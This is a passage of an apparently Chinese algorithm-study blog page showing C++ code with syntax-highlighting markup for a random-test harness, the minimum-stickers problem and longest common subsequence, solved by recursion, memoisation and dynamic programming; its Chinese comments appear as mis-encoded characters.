class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        str += (<span class="hljs-type">char</span>)(rand() % <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;0&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> str;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));  <span class="hljs-comment">// è®¾ç½®éšæœºç§å­</span><br><br>    <span class="hljs-type">int</span> N = <span class="hljs-number">30</span>;<br>    <span class="hljs-type">int</span> testTime = <span class="hljs-number">1000000</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-type">int</span> len = rand() % N;<br>        <span class="hljs-built_in">string</span> s = randomString(len);<br>        <span class="hljs-type">int</span> ans0 = number(s);<br>        <span class="hljs-type">int</span> ans1 = dp1(s);<br>        <span class="hljs-type">int</span> ans2 = dp2(s);<br>        <span class="hljs-keyword">if</span> (ans0 != ans1 || ans0 != ans2) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;number: &quot;</span> &lt;&lt; ans0 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp1: &quot;</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;dp2: &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•ç»“æŸ&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="è´´çº¸ç»„ç»„æˆç›®æ ‡æœ€å°æ•°é‡"><a href="#è´´çº¸ç»„ç»„æˆç›®æ ‡æœ€å°æ•°é‡" class="headerlink" title="è´´çº¸ç»„ç»„æˆç›®æ ‡æœ€å°æ•°é‡"></a>è´´çº¸ç»„ç»„æˆç›®æ ‡æœ€å°æ•°é‡</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ä»stickersé€‰æ‹©è´´çº¸ç»„ç»„æˆç›®æ ‡æœ€å°æ•°é‡å¹¶ä¸”æ¯ä¸ªè´´çº¸çš„æ•°é‡æ˜¯æ— é™çš„</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-built_in">string</span> rest = target;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : sticker) &#123;<br>            <span class="hljs-type">size_t</span> pos = rest.find(c);<br>            <span class="hljs-keyword">if</span> (pos != <span class="hljs-built_in">string</span>::npos) &#123;<br>                rest.erase(pos, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (rest.length() != target.length()) &#123;<br>            minCount = min(minCount, process1(stickers, rest));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> result = process1(stickers, target);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><br><br><span class="hljs-comment">// ä½¿ç”¨è¯é¢‘ç»Ÿè®¡çš„åŠ¨æ€è§„åˆ’æ–¹æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-keyword">if</span> (target.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">targetCounts</span><span class="hljs-params">(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : target) &#123;<br>        targetCounts[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>    &#125;<br><br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-keyword">if</span> (sticker[target[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">string</span> rest;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (targetCounts[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">int</span> remaining = targetCounts[i] - sticker[i];<br>                    <span class="hljs-keyword">if</span> (remaining &gt; <span class="hljs-number">0</span>) rest.append(remaining, <span class="hljs-string">&#x27;a&#x27;</span> + i); <span class="hljs-comment">//è®°å¾—é˜²æ­¢è¶Šç•Œ</span><br>                &#125;<br>            &#125;<br>            minCount = min(minCount, process2(stickers, rest));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> N = stickers.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; counts(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>));<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : stickers[i]) &#123;<br>            counts[i][c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> result = process2(counts, target);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><br><br><span class="hljs-comment">// ä½¿ç”¨è®°å¿†åŒ–çš„åŠ¨æ€è§„åˆ’</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target, <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-type">int</span>&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dp.find(target) != dp.end()) &#123;<br>        <span class="hljs-keyword">return</span> dp[target];<br>    &#125;<br><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">targetCounts</span><span class="hljs-params">(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : target) &#123;<br>        targetCounts[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>    &#125;<br><br>    <span class="hljs-type">int</span> minCount = INT_MAX;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; sticker : stickers) &#123;<br>        <span class="hljs-keyword">if</span> (sticker[target[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">string</span> rest;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (targetCounts[i] &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">int</span> remaining = targetCounts[i] - sticker[i];<br>                    <span class="hljs-keyword">if</span> (remaining &gt; <span class="hljs-number">0</span>) rest.append(remaining, <span class="hljs-string">&#x27;a&#x27;</span> + i);<br>                &#125;<br>            &#125;<br>            minCount = min(minCount, process3(stickers, rest, dp));<br>        &#125;<br>    &#125;<br><br>    dp[target] = minCount == INT_MAX ? INT_MAX : minCount + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> dp[target];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minStickers3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt;&amp; stickers, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; target)</span> &#123;<br>    <span class="hljs-type">int</span> N = stickers.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; counts(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">26</span>, <span class="hljs-number">0</span>));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : stickers[i]) &#123;<br>            counts[i][c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-type">int</span>&gt; dp;<br>    dp[<span class="hljs-string">&quot;&quot;</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> result = process3(counts, target, dp);<br>    <span class="hljs-keyword">return</span> result == INT_MAX ? <span class="hljs-number">-1</span> : result;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">string</span>&gt; stickers = &#123;<span class="hljs-string">&quot;with&quot;</span>, <span class="hljs-string">&quot;example&quot;</span>, <span class="hljs-string">&quot;science&quot;</span>&#125;;<br>    <span class="hljs-built_in">string</span> target = <span class="hljs-string">&quot;thehat&quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers1(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers2(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; minStickers3(stickers, target) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="æœ€é•¿å…¬å…±å­åºåˆ—"><a href="#æœ€é•¿å…¬å…±å­åºåˆ—" class="headerlink" title="æœ€é•¿å…¬å…±å­åºåˆ—"></a>æœ€é•¿å…¬å…±å­åºåˆ—</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ ·æœ¬å¯¹åº”æ¨¡å‹ï¼Œä»ç»“å°¾å¤„è®¨è®º</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’è§£æ³•ï¼Œstr1åœ¨0-iä¸Šå’Œstr2åœ¨0-jä¸Šçš„æœ€é•¿å…¬å…±å­åºåˆ—</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str2, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// str1[0..0]å’Œstr2[0..0]ï¼Œéƒ½åªå‰©ä¸€ä¸ªå­—ç¬¦äº†ï¼Œæ ·æœ¬å¯¹åº”æ¨¡å‹è®¨è®ºç»“å°¾ä¹Ÿå°±æ˜¯ièƒ½ä½œä¸ºå’Œä¸ä½œä¸ºç­”æ¡ˆçš„ä¸jä½œä¸ºç­”æ¡ˆå’Œä¸ä½œä¸ºç­”æ¡ˆçš„æƒ…å†µ</span><br>        <span class="hljs-keyword">return</span> str1[i] == str2[j] ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] == str2[j]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> process1(str1, str2, i, j - <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] == str2[j]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> process1(str1, str2, i - <span class="hljs-number">1</span>, j);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// i != 0 &amp;&amp; j != 0</span><br>        <span class="hljs-type">int</span> p1 = process1(str1, str2, i - <span class="hljs-number">1</span>, j);<br>        <span class="hljs-type">int</span> p2 = process1(str1, str2, i, j - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + process1(str1, str2, i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>)) : <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> max(p1, max(p2, p3));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-keyword">return</span> process1(str1, str2, str1.size() - <span class="hljs-number">1</span>, str2.size() - <span class="hljs-number">1</span>);<br>&#125;<br><br><br><br><br><span class="hljs-comment">//å‚»ç¼“å­˜</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str1, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt;&amp; str2, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; dp)</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœå·²ç»è®¡ç®—è¿‡è¿™ä¸ªå­é—®é¢˜ï¼Œç›´æ¥è¿”å›ç»“æœ</span><br>    <span class="hljs-keyword">if</span> (dp[i][j] != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-keyword">return</span> dp[i][j];<br>    &#125;<br>    <span class="hljs-comment">// è®¡ç®—æœ€é•¿å…¬å…±å­åºåˆ—</span><br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> &amp;&amp; j == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : process1(str1, str2, i, j - <span class="hljs-number">1</span>, dp);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>) &#123;<br>        dp[i][j] = (str1[i] == str2[j]) ? <span class="hljs-number">1</span> : process1(str1, str2, i - <span class="hljs-number">1</span>, j, dp);<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// i != 0 &amp;&amp; j != 0</span><br>        <span class="hljs-type">int</span> p1 = process1(str1, str2, i - <span class="hljs-number">1</span>, j, dp);<br>        <span class="hljs-type">int</span> p2 = process1(str1, str2, i, j - <span class="hljs-number">1</span>, dp);<br>        <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + process1(str1, str2, i - <span class="hljs-number">1</span>, j - <span class="hljs-number">1</span>, dp)) : <span class="hljs-number">0</span>;<br>        dp[i][j] = max(p1, max(p2, p3));<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[i][j];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-type">int</span> m = str1.size();<br>    <span class="hljs-type">int</span> n = str2.size();<br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª dp æ•°ç»„ï¼Œåˆå§‹åŒ–ä¸º -1ï¼Œè¡¨ç¤ºè¿˜æ²¡æœ‰è®¡ç®—è¿‡</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(m, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n, <span class="hljs-number">-1</span>));<br>    <span class="hljs-keyword">return</span> process1(str1, str2, m - <span class="hljs-number">1</span>, n - <span class="hljs-number">1</span>, dp);<br>&#125;<br><br><br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">longestCommonSubsequence2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s1, <span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; s2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (s1.empty() || s2.empty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str1</span><span class="hljs-params">(s1.begin(), s1.end())</span>;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title function_">str2</span><span class="hljs-params">(s2.begin(), s2.end())</span>;<br>    <span class="hljs-type">int</span> N = str1.size();<br>    <span class="hljs-type">int</span> M = str2.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(M, <span class="hljs-number">0</span>));<br><br>    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = (str1[<span class="hljs-number">0</span>] == str2[<span class="hljs-number">0</span>]) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    <span 